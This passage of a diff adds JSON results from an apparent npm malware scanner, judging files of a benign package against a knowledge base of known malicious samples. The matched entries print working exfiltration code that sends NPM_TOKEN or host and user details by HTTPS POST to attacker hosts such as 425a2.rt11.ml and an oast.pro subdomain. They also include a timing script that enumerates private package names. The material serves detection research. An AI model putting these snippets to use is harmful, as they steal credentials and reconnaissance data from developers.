+              "match_type": "combined",
+              "similarity_score": 0.5335096120834351,
+              "code_similarity": 0.4038357138633728,
+              "behavior_similarity": 0.6631835699081421,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "// Actual code pattern from the malicious ua-parser-js versions:\nconst https = require('https');\nconst token = process.env['NPM_TOKEN'];\nif (token) {\n  const req = https.request({hostname: 'malicious-domain.com', method: 'POST'}, res => {});\n  req.write(token);\n  req.end();\n}",
+                "code_behavior": "At import-time, the code accesses the NPM_TOKEN environment variable and sends its value to a hardcoded malicious domain via HTTPS POST, enabling credential exfiltration.",
+                "malice_analysis": {
+                  "why_suspicious": "Accessing sensitive environment variables and exfiltrating their values to an external server is a clear sign of credential theft and malicious intent.",
+                  "violated_expectations": "Legitimate packages should not access or transmit sensitive environment variables to third parties. Such behavior is outside the scope of normal package functionality.",
+                  "similar_legitimate_use": "Some CI/CD tools or deployment scripts may access environment variables for internal use, but never to send them to untrusted domains or external servers.",
+                  "key_indicators": [
+                    "Access to process.env for sensitive variables (e.g., NPM_TOKEN)",
+                    "Network exfiltration to hardcoded, untrusted domain",
+                    "Automatic execution on import without user interaction",
+                    "No legitimate reason for external transmission of credentials"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time",
+                  "file_location": "main entry point (e.g., index.js) or a required module loaded on import",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "ua-parser-js",
+                  "package_manager": "npm",
+                  "package_versions": "0.7.29, 0.8.0, 1.0.0 (three malicious versions released in October 2021)",
+                  "why_malicious": "Attackers compromised the maintainer's npm account and published three malicious versions of the ua-parser-js package. These versions contained code that executed remote payloads during installation and exfiltrated sensitive environment variables at runtime, enabling attackers to steal credentials and potentially take control of affected systems."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious code is executed during package installation via a postinstall script, which downloads and runs a remote payload from an attacker-controlled server.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "System compromise, remote code execution, and installation of additional malware"
+                  },
+                  {
+                    "step": 2,
+                    "action": "At import-time, the malicious code accesses sensitive environment variables (such as NPM_TOKEN) and exfiltrates them to an attacker-controlled server.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Credential theft, unauthorized access to private repositories, and potential lateral movement"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Execution of postinstall scripts that invoke shell commands to download and execute remote code",
+                    "Access to sensitive environment variables (e.g., NPM_TOKEN) followed by network requests to untrusted domains",
+                    "Unexpected outbound network activity during package installation or import-time"
+                  ],
+                  "file_indicators": [
+                    "package.json containing postinstall scripts referencing external URLs or invoking shell commands",
+                    "JavaScript files that use child_process.exec() or similar to run curl/wget piped to sh",
+                    "Source files accessing process.env for sensitive variables and sending data over the network"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTP/HTTPS requests to domains not associated with ua-parser-js or its legitimate infrastructure",
+                    "Connections to hardcoded or known malicious domains during or immediately after installation/import"
+                  ],
+                  "how_to_detect": "Monitor npm package installations for postinstall scripts that execute shell commands or download remote resources. Flag packages that access sensitive environment variables and transmit their values to external domains. Use network monitoring to detect unexpected outbound connections to untrusted domains during package installation or import. Review package.json and source files for suspicious scripts, use of child_process, or hardcoded domains."
+                }
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/shoulder/2.1.0/package/lib/Project.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/shoulder/2.1.0/package/lib/ProjectStats.js",
+      "status": "success",
+      "is_malicious": false,
+      "total_slices": 1,
+      "malicious_slices": 0,
+      "slice_results": [
+        {
+          "slice_id": "ProjectStats_slice_1",
+          "code_snippet": "const _ = require('lodash');\n\nconst ModuleStats = require('./ModuleStats');\n\nconst WEEK_IN_MILLISECONDS = 604800000; // 7 * 24 * 60 * 60 * 1000\n\nconst packageNamesByMagnitude = metricResult =>\n  _.chain(metricResult)\n    .toPairs()\n    .orderBy(([, magnitude]) => magnitude, 'desc')\n    .map(([packageName]) => packageName)\n    .value();\n\nclass ProjectStats {\n  constructor(projects) {\n    this.projects = projects;\n  }\n\n  fetchDownloadsForProjects() {\n    const statsPromises = {};\n\n    const until = Date.now();\n    const durationOptions = {\n      until,\n      since: until - WEEK_IN_MILLISECONDS\n    };\n\n    this.projects.forEach(({ npmName: packageName }) => {\n      statsPromises[packageName] = ModuleStats.createNpmDownloadsRequest(\n        packageName,\n        durationOptions\n      )\n        .catch(() => []) // default result on request error\n        .then(dataPoints => {\n          statsPromises[packageName] = 0;\n          dataPoints.forEach(\n            ({ downloads }) => (statsPromises[packageName] += downloads)\n          );\n        });\n    });\n\n    return Promise.all(Object.values(statsPromises)).then(() => {\n      return statsPromises;\n    });\n  }\n\n  fetchStarsForProjects() {\n    return Promise.resolve().then(async () => {\n      const statsPromises = {};\n\n      for (const { repoUrl: packageName } of this.projects) {\n        let repositoryInfo;\n        try {\n          repositoryInfo = await ModuleStats.createGitHubRepositoryRequest(\n            packageName\n          );\n        } catch (e) {\n          repositoryInfo = {}; // default result on request error\n        }\n        statsPromises[packageName] = repositoryInfo.stargazers_count || 0;\n      }\n\n      return statsPromises;\n    });\n  }\n\n  fetchMetricForProjects(metric) {\n    switch (metric) {\n      case 'downloads':\n        return this.fetchDownloadsForProjects();\n      case 'stars':\n        return this.fetchStarsForProjects();\n      default:\n        return Promise.reject(\n          new Error(`${metric} is not a supported metric.`)\n        );\n    }\n  }\n\n  outputProjectNamesForMetric(metric) {\n    return this.fetchMetricForProjects(metric).then(packageNamesByMagnitude);\n  }\n}\n\nProjectStats.packageNamesByMagnitude = packageNamesByMagnitude;\n\nmodule.exports = ProjectStats;\n",
+          "is_malicious": false,
+          "malice_score": 0.44370057781537375,
+          "confidence": 0.1,
+          "behavior_summary": "When called, the code performs network operations via ModuleStats methods to fetch download counts and GitHub star counts for a list of projects. It accesses project metadata including npm package names and repository URLs, then sends HTTP requests to external APIs to retrieve usage and popularity metrics. The collected data is aggregated and returned, enabling project popularity analysis but involving external network communication with potentially sensitive project identifiers.",
+          "explanation": "[LLM Judgment: Benign] The analyzed code is a legitimate utility for aggregating and reporting project popularity metrics such as npm downloads and GitHub stars. It uses network requests to public APIs via the ModuleStats module, which is expected behavior for such analytics tools. Unlike the known malicious patterns, it does not collect sensitive system or user information (e.g., os.homedir(), os.userInfo(), hostname), nor does it exfiltrate data to attacker-controlled domains. The network communication is limited to fetching public project metadata, not sending private or host environment data. There is no obfuscation, no automatic execution on import that leaks data, and no suspicious external domains hardcoded. The similarity scores to known malware are low (0.44-0.45) and relate mostly to network activity, which is common in many benign packages. Therefore, this code is not malicious.",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20241224_133738_794486_snippet_1",
+              "source_package": "azureazure, azure-sdk-v4, glints-sdk, azure-sdk-v3 (npm, PyPI)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_133738_794486/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4476078748703003,
+              "code_similarity": 0.4671820104122162,
+              "behavior_similarity": 0.428033709526062,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "const os = require('os');\nconst https = require('https');\nconst package = require('./package.json');\n\nconst trackingData = JSON.stringify({\n  c: __dirname,\n  hd: os.homedir(),\n  hn: os.hostname(),\n  un: os.userInfo().username,\n  dns: '8.8.8.8',\n  package: package.name,\n  version: package.version\n});\n\nvar options = {\n  hostname: '425a2.rt11.ml',\n  port: 443,\n  path: '/',\n  method: 'POST',\n  headers: {\n    'Content-Type': 'application/x-www-form-urlencoded',\n    'Content-Length': trackingData.length\n  }\n};\n\nvar req = https.request(options, (res) => {\n  res.on('data', (d) => {\n    process.stdout.write(d);\n  });\n});\nreq.on('error', (e) => {});\nreq.write(trackingData);\nreq.end();",
+                "code_behavior": "At import-time, the code collects system and user information (current directory, home directory, hostname, username, package metadata) and sends it via HTTPS POST to 425a2.rt11.ml, resulting in exfiltration of host data to an attacker-controlled server.",
+                "malice_analysis": {
+                  "why_suspicious": "The code collects sensitive host and user information and exfiltrates it to an external, attacker-controlled domain without user knowledge or consent, which is a hallmark of malicious reconnaissance and data theft.",
+                  "violated_expectations": "Legitimate packages do not collect or transmit system/user information to external servers during import or installation, especially without explicit user consent.",
+                  "similar_legitimate_use": "Telemetry or crash reporting (with user consent and a clear privacy policy), but not at import-time and not to untrusted domains.",
+                  "key_indicators": [
+                    "Access to os.homedir(), os.hostname(), os.userInfo()",
+                    "Hardcoded external domain (425a2.rt11.ml)",
+                    "Automatic execution on import",
+                    "Transmission of system/user data via HTTPS POST"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time",
+                  "file_location": "index.js (npm package entrypoint)",
+                  "required_permissions": [
+                    "network",
+                    "filesystem",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "azureazure, azure-sdk-v4, glints-sdk, azure-sdk-v3",
+                  "package_manager": "npm, PyPI",
+                  "package_versions": "all published versions (e.g., glints-sdk@99.10.11)",
+                  "why_malicious": "These packages perform unauthorized collection and exfiltration of sensitive system and user information to attacker-controlled endpoints using both HTTPS POST and DNS tunneling, often leveraging legitimate webhook/SaaS services. The behavior is consistent across multiple packages and platforms, indicating a coordinated supply chain attack leveraging dependency confusion. The packages masquerade as legitimate or 'whitehat' tools, but execute malicious code at import-time or install-time without user consent."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious package is installed or imported, triggering execution of the entrypoint code.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2",
+                      "snippet_5"
+                    ],
+                    "leads_to": "System reconnaissance and data collection"
+                  },
+                  {
+                    "step": 2,
+                    "action": "System and user information is collected, including home directory, hostname, username, and external IP address.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2",
+                      "snippet_4",
+                      "snippet_5"
+                    ],
+                    "leads_to": "Preparation of exfiltration payload"
+                  },
+                  {
+                    "step": 3,
+                    "action": "Files in sensitive directories are enumerated for further profiling or exfiltration.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Augmentation of exfiltration payload"
+                  },
+                  {
+                    "step": 4,
+                    "action": "Collected data is exfiltrated to attacker-controlled endpoints via HTTPS POST and/or DNS tunneling.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2",
+                      "snippet_5"
+                    ],
+                    "leads_to": "Attacker receives sensitive host data"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Automatic collection of system and user information at import or install time",
+                    "Network requests to known webhook/SaaS endpoints (e.g., interactsh, burpcollaborator, pipedream, webhook.site) or attacker-controlled domains (e.g., 425a2.rt11.ml)",
+                    "Obfuscated JavaScript code in package entrypoints performing network exfiltration",
+                    "DNS queries to attacker-controlled subdomains for covert data exfiltration"
+                  ],
+                  "file_indicators": [
+                    "index.js or __init__.py containing os, https, requests, or dns modules with hardcoded external domains",
+                    "Obfuscated JavaScript in package entrypoints (e.g., variable/function names like _0xabc, _0xdef)",
+                    "References to interactsh, burpcollaborator, pipedream, webhook.site, or 425a2.rt11.ml in code"
+                  ],
+                  "network_indicators": [
+                    "HTTPS POST requests to 425a2.rt11.ml, burpcollaborator.net, pipedream.net, webhook.site",
+                    "DNS queries to subdomains of attacker-controlled domains (e.g., *.425a2.rt11.ml)",
+                    "Outbound requests to api.ipify.org for external IP collection"
+                  ],
+                  "how_to_detect": "Monitor for packages that access system or user information and make outbound network requests to known webhook/SaaS endpoints or attacker-controlled domains at install or import time. Flag obfuscated code in package entrypoints that performs network communication. Detect DNS queries to attacker-controlled subdomains, especially when correlated with suspicious package installation or import events. Use static and dynamic analysis to identify hardcoded domains and automated data exfiltration logic."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_130802_273005_snippet_1",
+              "source_package": "everything (npm)",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20241224_130802_273005/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4436817169189453,
+              "code_similarity": 0.4286274313926697,
+              "behavior_similarity": 0.45873603224754333,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "\"dependencies\": { \"package1\": \"*\", \"package2\": \"*\", ..., \"packageN\": \"*\" } // where every public NPM package is listed as a dependency",
+                "code_behavior": "At install-time, the package.json declares dependencies on every public NPM package, causing the package manager to recursively resolve, download, and attempt to install all of them, resulting in massive network traffic, disk space exhaustion, and build process failure.",
+                "malice_analysis": {
+                  "why_suspicious": "Declaring dependencies on every public NPM package is highly abnormal and serves no functional purpose. This behavior is designed to overwhelm the package manager and system resources, leading to denial of service.",
+                  "violated_expectations": "A legitimate package.json should only declare dependencies that are necessary for the package's intended functionality. This package abuses the dependency mechanism by including all public packages, which is never required for any valid use case.",
+                  "similar_legitimate_use": "Legitimate meta-packages may depend on a small, related set of packages (e.g., a framework and its plugins), but no legitimate package would ever depend on every public package in the registry.",
+                  "key_indicators": [
+                    "package.json with an extremely large dependency list (thousands to millions of entries)",
+                    "Dependencies include unrelated and excessive packages from across the NPM ecosystem",
+                    "Absence of any meaningful application or source code",
+                    "Installation triggers massive, simultaneous network requests and disk writes"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "install-time",
+                  "file_location": "package.json",
+                  "required_permissions": [
+                    "filesystem",
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "everything",
+                  "package_manager": "npm",
+                  "package_versions": "latest (2024-01)",
+                  "why_malicious": "The 'everything' package is intentionally crafted to declare dependencies on every publicly available NPM package in its package.json. This results in an extremely large dependency tree, causing the NPM package manager to attempt to download and install millions of packages during installation. The outcome is rapid exhaustion of disk space, severe build failures, and denial of service for any system or CI/CD pipeline that installs it. The package's sole purpose is to disrupt the NPM ecosystem and cause operational damage, with no legitimate functionality."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User or CI/CD system installs the 'everything' package.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Triggers the NPM package manager to resolve and download all public packages."
+                  },
+                  {
+                    "step": 2,
+                    "action": "NPM attempts to fetch and install millions of dependencies as declared in package.json.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Rapidly exhausts disk space, causes build failures, and results in denial of service for the system or pipeline."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "package.json with an abnormally large number of dependencies (thousands or more)",
+                    "Dependency list includes unrelated or all public NPM packages",
+                    "Installation process triggers massive, simultaneous network requests to the NPM registry",
+                    "Absence of meaningful application or source code in the package"
+                  ],
+                  "file_indicators": [
+                    "package.json file containing thousands or millions of dependencies",
+                    "No index.js or main application file present",
+                    "No source code files beyond package.json"
+                  ],
+                  "network_indicators": [
+                    "NPM registry requests for every public package within a short time window",
+                    "Unusually high volume of outbound connections to registry.npmjs.org during installation"
+                  ],
+                  "how_to_detect": "Perform static analysis of package.json files to flag packages with extremely large dependency lists, especially those including unrelated or all public NPM packages. Monitor installation processes for excessive network requests to the NPM registry and rapid disk space consumption. Automated CI/CD pipelines should reject packages with dependency lists exceeding a reasonable threshold or containing patterns indicative of registry-wide inclusion."
+                }
+              }
+            },
+            {
+              "match_id": "20250105_195714_456059_snippet_1",
+              "source_package": "deere-ui-domain-framework-mixins (and 16 others, see list) (npm)",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20250105_195714_456059/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4415260851383209,
+              "code_similarity": 0.456026554107666,
+              "behavior_similarity": 0.42702561616897583,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "const os = require('os');\nconst dns = require('dns');\nconst querystring = require('querystring');\nconst https = require('https');\nconst packageJSON = require('./package.json');\nconst package = packageJSON.name;\n\nconst trackingData = JSON.stringify({\n  c: package,\n  h: os.homedir(),\n  d: os.hostname(),\n  hn: os.hostname(),\n  os: os.userInfo().username,\n  dns: os.getServers(),\n  v: packageJSON.version,\n  r: packageJSON._resolved || undefined,\n  pjson: packageJSON,\n});\n\nvar postData = querystring.stringify({\n  msg: trackingData,\n});\n\nvar options = {\n  hostname: `${whoami}.${hostname}.duif.L4.[redacted].canarytokens.com`,\n  port: 443,\n  path: '/',\n  method: 'POST',\n  headers: {\n    'Content-Type': 'application/x-www-form-urlencoded',\n    'Content-Length': postData.length,\n  },\n};",
+                "code_behavior": "At import-time or during postinstall, the code collects local system and user information (including username, hostname, home directory, DNS servers, and package metadata), serializes it, and sends it via an outbound HTTPS POST request to a canarytokens.com domain controlled by the attacker, resulting in exfiltration of internal environment details.",
+                "malice_analysis": {
+                  "why_suspicious": "The code programmatically gathers sensitive host and user data and transmits it to an external domain without user knowledge or consent. This is a clear indicator of malicious intent, as legitimate packages do not require or perform such actions during installation or import.",
+                  "violated_expectations": "Standard npm packages do not collect or exfiltrate environment or user data to external servers during install or import. Such behavior is a direct violation of user privacy and security best practices, and is not expected in any legitimate package, especially without explicit user opt-in and documentation.",
+                  "similar_legitimate_use": "Some legitimate telemetry or crash reporting libraries may collect limited environment data, but only after explicit user consent and with transparent documentation. They never perform silent data exfiltration during install/import, and always provide opt-out mechanisms.",
+                  "key_indicators": [
+                    "Collection of sensitive OS data: os.homedir(), os.hostname(), os.userInfo().username",
+                    "Use of canarytokens.com or similar external tracking domains as exfiltration endpoints",
+                    "Outbound HTTPS POST request triggered at install/import time",
+                    "No user notification, consent, or documentation of data collection or transmission",
+                    "Combination of os, dns, https, and querystring modules in the package entrypoint"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time or postinstall (depending on how the package is used)",
+                  "file_location": "index.js (main entry point of the package)",
+                  "required_permissions": [
+                    "network access (outbound HTTPS)",
+                    "read access to environment variables",
+                    "read access to OS user and host information"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "deere-ui-domain-framework-mixins (and 16 others, see list)",
+                  "package_manager": "npm",
+                  "package_versions": "1.1.2, 1.0.0 (and similar for all listed packages)",
+                  "why_malicious": "These packages are dependency confusion payloads crafted to impersonate John Deere's internal/private npm dependencies. Upon installation or import, they execute code that collects sensitive host and user environment information and exfiltrates it to an attacker-controlled canarytokens.com domain. This behavior constitutes a supply chain attack, as it enables the attacker to confirm internal package usage and gather reconnaissance data from developer or CI environments."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "A malicious package is installed as a result of dependency confusion, where the public package name matches an internal/private dependency used by the target organization.",
+                    "implemented_by": [],
+                    "leads_to": "Execution of the package's code on the developer's machine or CI system."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Upon installation or import, the package executes code that collects local system and environment information, including user and host details.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Preparation of sensitive data for exfiltration."
+                  },
+                  {
+                    "step": 3,
+                    "action": "The collected data is serialized and sent via an outbound HTTPS POST request to an attacker-controlled canarytokens.com domain.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Attacker receives notification and detailed environment information, confirming successful dependency confusion and internal package usage."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "npm package that collects OS/user/environment data (e.g., os.homedir(), os.hostname(), os.userInfo().username) at install or import time",
+                    "Network requests to canarytokens.com or similar tracking domains during npm install or import",
+                    "Use of os, dns, https, and querystring modules together in the package entrypoint to facilitate data collection and exfiltration"
+                  ],
+                  "file_indicators": [
+                    "index.js or main entrypoint file containing references to os.homedir(), os.hostname(), os.userInfo()",
+                    "Hardcoded references to canarytokens.com or similar external tracking domains in code",
+                    "Presence of code that performs outbound HTTPS POST requests to external domains in the package entrypoint"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTPS POST requests to *.canarytokens.com domains during npm install or import",
+                    "Unusual DNS lookups or outbound connections to external tracking domains (e.g., canarytokens.com) initiated by npm packages"
+                  ],
+                  "how_to_detect": "Monitor npm package installations and imports for unexpected outbound network activity, especially HTTPS POST requests to canarytokens.com or similar domains. Statistically analyze package entrypoints (such as index.js) for the combined use of os, dns, https, and querystring modules, and for code that collects and transmits environment data. Flag any package that performs network exfiltration of host/user information during install/import, particularly if such behavior is undocumented or unnecessary for the package's stated purpose."
+                }
+              }
+            },
+            {
+              "match_id": "20250102_113914_370715_snippet_1",
+              "source_package": " (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20250102_113914_370715/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.43985408544540405,
+              "code_similarity": 0.37321391701698303,
+              "behavior_similarity": 0.5064942836761475,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "for pkg in package_list:\n    times = []\n    for i in range(5):\n        start = time.time()\n        response = requests.get(f'https://registry.npmjs.org/{pkg}')\n        times.append(time.time() - start)\n    avg_time = sum(times) / len(times)\n    if avg_time > threshold:\n        print(f'Package {pkg} likely exists as private')",
+                "code_behavior": "During reconnaissance, the script sends multiple HTTP GET requests to the npm registry for each candidate package name, measures the response time for each request, performs statistical analysis on the timing data, and infers the existence of private packages based on response time thresholds, enabling enumeration of private package names.",
+                "malice_analysis": {
+                  "why_suspicious": "This code is suspicious because it systematically probes the npm registry using timing analysis to infer the existence of private packages, a technique commonly used for unauthorized resource enumeration and reconnaissance prior to supply chain attacks.",
+                  "violated_expectations": "Legitimate use of the npm registry involves querying for known public packages or performing standard package management operations. In contrast, this code performs repeated, automated timing-based probes for a large set of package names, specifically to discover private or internal resources, which is not expected in normal workflows.",
+                  "similar_legitimate_use": "Performance monitoring tools may measure API response times for health checks or diagnostics, but they do not target non-existent or private package names in bulk, nor do they use timing data to infer the existence of sensitive resources.",
+                  "key_indicators": [
+                    "Automated, repeated HTTP requests to registry.npmjs.org for a large list of package names, including non-existent or private ones",
+                    "Statistical or threshold-based analysis of response times to distinguish between public, private, and non-existent packages",
+                    "Output or logging that identifies likely private package names based on timing results",
+                    "Use of external scripts or tools specifically for package name enumeration"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "manual or automated reconnaissance phase",
+                  "file_location": "external reconnaissance script or tool (not within a package)",
+                  "required_permissions": [
+                    "network access to registry.npmjs.org"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "",
+                  "package_manager": "npm",
+                  "package_versions": "",
+                  "why_malicious": "This report analyzes a supply chain attack technique targeting the npm ecosystem. Attackers exploit timing differences in the npm registry API to enumerate the existence of private package names. By identifying these private packages, attackers can publish malicious public packages with identical names, increasing the risk of users or automated systems inadvertently installing the malicious versions and enabling further compromise."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Attacker compiles a list of potential package names, often using dictionary attacks or scraping public sources.",
+                    "implemented_by": [],
+                    "leads_to": "Step 2"
+                  },
+                  {
+                    "step": 2,
+                    "action": "Attacker uses an automated script to send multiple HTTP requests to the npm registry for each package name, measuring response times to infer which packages exist as private.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Step 3"
+                  },
+                  {
+                    "step": 3,
+                    "action": "Attacker registers and publishes public packages with the same names as the discovered private packages, embedding malicious code in these new public packages.",
+                    "implemented_by": [],
+                    "leads_to": "Step 4"
+                  },
+                  {
+                    "step": 4,
+                    "action": "Victims are tricked into installing the malicious public packages, either manually or via automated tooling, resulting in supply chain compromise.",
+                    "implemented_by": [],
+                    "leads_to": "Final goal: compromise of victim systems via malicious package installation"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Automated, repeated HTTP requests to the npm registry for a large set of package names, especially those not found in the public registry",
+                    "Statistical or threshold-based analysis of npm registry response times to infer package existence",
+                    "Creation and publication of new public packages with names matching previously private or internal packages"
+                  ],
+                  "file_indicators": [
+                    "Presence of scripts or tools that enumerate npm package names and perform timing analysis (e.g., scripts containing repeated requests to registry.npmjs.org and timing logic)",
+                    "Newly published public packages with names that match known internal or private package naming conventions"
+                  ],
+                  "network_indicators": [
+                    "Burst traffic patterns to registry.npmjs.org with requests for many package names in rapid succession",
+                    "Repeated HTTP GET requests to registry.npmjs.org for package names that do not exist in the public registry",
+                    "Short-interval, high-volume requests to the npm API endpoints"
+                  ],
+                  "how_to_detect": "Monitor for automated or repeated requests to the npm registry for package names that are not present in the public registry, especially when requests are closely spaced and followed by timing analysis. Flag the sudden appearance of public packages with names previously used internally. Detect and alert on scripts or tools that perform timing-based enumeration of package existence, and correlate with network activity patterns indicative of reconnaissance."
+                }
+              }
+            },
+            {
+              "match_id": "20250105_195714_455419_snippet_2",
+              "source_package": "['@zettle-bo/account-settings', '@zettle-bo/account-statement', '@zettle-bo/apps', '@zettle-bo/bank-settings', '@zettle-bo/bootstrapper', '@zettle-bo/capital', '@zettle-bo/cash-register', '@zettle-bo/customers', '@zettle-bo/dashboard', '@zettle-bo/direct-debit', '@zettle-bo/integrations', '@zettle-bo/inventory', '@zettle-bo/invoices', '@zettle-bo/pp-profile-widget', '@zettle-bo/products', '@zettle-bo/react', '@zettle-bo/react-router-dom', '@zettle-bo/react-spa', '@zettle-bo/receipts', '@zettle-bo/routes', '@zettle-bo/sales-trends', '@zettle-bo/settings', '@zettle-bo/shell', '@zettle-bo/staff-account', '@zettle-bo/vertical-navigation', 'airbn-geetest3', 'airbnb-env', 'airbnb-erf', 'airbnb-i18n-polyglot', 'airbnb-l10n', 'airbnb-mediator', 'airbnb-moment-more-format'] (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20250105_195714_455419/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4384559988975525,
+              "code_similarity": 0.44115501642227173,
+              "behavior_similarity": 0.43575695157051086,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "//author-- whitehacker003@protonmail.com\nconst os = require('os');\nconst dns = require('dns');\nconst querystring = require('querystring');\nconst https = require('https');\nconst packageJSON = require('./package.json');\nconst trackingData = JSON.stringify({\n  p: packageJSON.name,\n  c: os.cpus(),\n  hd: os.homedir(),\n  hn: os.hostname(),\n  un: os.userInfo().username,\n  dns: dns.getServers(),\n  r: packageJSON.__resolved,\n  v: packageJSON.version,\n  json: packageJSON,\n});\nvar postData = querystring.stringify({\n  msg: trackingData,\n});\nvar options = {\n  hostname: 'cj56jbj5dpjnojrhvbp2t4fnmokpu14.oast.pro',\n  port: 443,\n  path: '/',\n  method: 'POST',\n  headers: {\n    'Content-Type': 'application/x-www-form-urlencoded',\n    'Content-Length': postData.length,\n  },\n};",
+                "code_behavior": "At import-time, the code collects detailed system and environment information (CPU details, home directory, hostname, username, DNS servers, and package metadata), serializes it, and sends it via HTTPS POST to an external domain, resulting in exfiltration of sensitive host data.",
+                "malice_analysis": {
+                  "why_suspicious": "The code gathers sensitive system and environment information and exfiltrates it to an external, attacker-controlled domain without user knowledge or consent. This enables reconnaissance of internal environments and can facilitate further targeted attacks.",
+                  "violated_expectations": "Legitimate packages do not collect and transmit host or environment information on import, especially to untrusted domains, and always require user consent for telemetry.",
+                  "similar_legitimate_use": "Some analytics or error reporting packages may collect limited telemetry, but this is always documented, opt-in, and never includes sensitive host details like usernames or DNS servers.",
+                  "key_indicators": [
+                    "Collection of sensitive system and environment data (CPU, home directory, hostname, username, DNS servers)",
+                    "Network exfiltration via HTTPS POST to non-standard domain (oast.pro)",
+                    "No user notification or consent for data collection or transmission",
+                    "Presence of code referencing os, dns, and process environment in package entry point"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time",
+                  "file_location": "index.js (airbnb packages)",
+                  "required_permissions": [
+                    "network",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": [
+                    "@zettle-bo/account-settings",
+                    "@zettle-bo/account-statement",
+                    "@zettle-bo/apps",
+                    "@zettle-bo/bank-settings",
+                    "@zettle-bo/bootstrapper",
+                    "@zettle-bo/capital",
+                    "@zettle-bo/cash-register",
+                    "@zettle-bo/customers",
+                    "@zettle-bo/dashboard",
+                    "@zettle-bo/direct-debit",
+                    "@zettle-bo/integrations",
+                    "@zettle-bo/inventory",
+                    "@zettle-bo/invoices",
+                    "@zettle-bo/pp-profile-widget",
+                    "@zettle-bo/products",
+                    "@zettle-bo/react",
+                    "@zettle-bo/react-router-dom",
+                    "@zettle-bo/react-spa",
+                    "@zettle-bo/receipts",
+                    "@zettle-bo/routes",
+                    "@zettle-bo/sales-trends",
+                    "@zettle-bo/settings",
+                    "@zettle-bo/shell",
+                    "@zettle-bo/staff-account",
+                    "@zettle-bo/vertical-navigation",
+                    "airbn-geetest3",
+                    "airbnb-env",
+                    "airbnb-erf",
+                    "airbnb-i18n-polyglot",
+                    "airbnb-l10n",
+                    "airbnb-mediator",
+                    "airbnb-moment-more-format"
+                  ],
+                  "package_manager": "npm",
+                  "package_versions": "35.0.0 (zettle-bo packages), 1.0.0 (airbnb packages, assumed)",
+                  "why_malicious": "These packages are proof-of-concept (PoC) dependency confusion attacks that attempt to exfiltrate system information or download and execute code from external servers. While no outright malicious payload is present, the behavior is consistent with supply chain attack techniques and poses a risk to internal systems if installed. The packages make unsolicited network requests during installation or import, which can be used to confirm internal usage or leak sensitive environment data."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious package is installed via dependency confusion, replacing or supplementing an internal package with an attacker-controlled version.",
